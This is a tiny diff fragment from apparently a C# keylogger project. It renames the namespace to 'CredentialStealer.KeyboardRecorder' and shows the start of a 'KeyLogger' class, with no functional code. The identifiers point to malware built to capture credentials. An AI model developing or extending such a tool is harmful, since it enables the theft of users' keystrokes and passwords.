@@ -9,7 +9,7 @@ using System.Diagnostics;
 using System.Threading;
 using System.IO;
 
-namespace KeyboardRecorder
+namespace CredentialStealer.KeyboardRecorder
 {
     class KeyLogger
     {
